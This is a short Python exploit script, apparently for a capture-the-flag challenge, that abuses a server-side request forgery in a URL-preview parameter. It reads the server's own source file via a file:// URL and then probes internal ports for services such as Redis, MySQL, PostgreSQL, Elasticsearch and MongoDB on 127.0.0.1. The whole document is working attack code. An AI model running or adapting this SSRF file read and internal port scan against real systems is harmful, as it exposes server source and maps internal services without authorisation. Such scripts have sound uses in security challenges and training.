import urllib.request
import urllib.parse

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch_raw(target_url):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    res = urllib.request.urlopen(req)
    return res.read()

# Get the raw bytes
raw = fetch_raw('file:///var/www/html/index.php')

# Find preview-content and dump raw bytes
marker = b'class="preview-content">'
start = raw.find(marker)
if start != -1:
    start += len(marker)
    end = raw.find(b'</div>', start)
    content = raw[start:end]
    # Print repr to see all entities/tags
    print('LENGTH:', len(content))
    print()
    print(content.decode('utf-8', errors='replace'))
else:
    print('No preview-content found')

# Also check internal ports using gopher/http
print()
print('=== Checking internal services ===')
for port in [6379, 11211, 3306, 5432, 8080, 8000, 9200, 27017]:
    target = f'http://127.0.0.1:{port}/'
    url = BASE + '?url=' + urllib.parse.quote(target)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req)
        html = res.read().decode()
        if 'preview-content' in html:
            idx = html.find('class="preview-content">')
            content = html[idx+len('class="preview-content">'):idx+500]
            print(f'Port {port}: PREVIEW - {content[:100]}')
        elif 'error-msg' in html:
            print(f'Port {port}: Error (service down or refused)')
        else:
            print(f'Port {port}: Other response')
    except Exception as e:
        print(f'Port {port}: {e}')
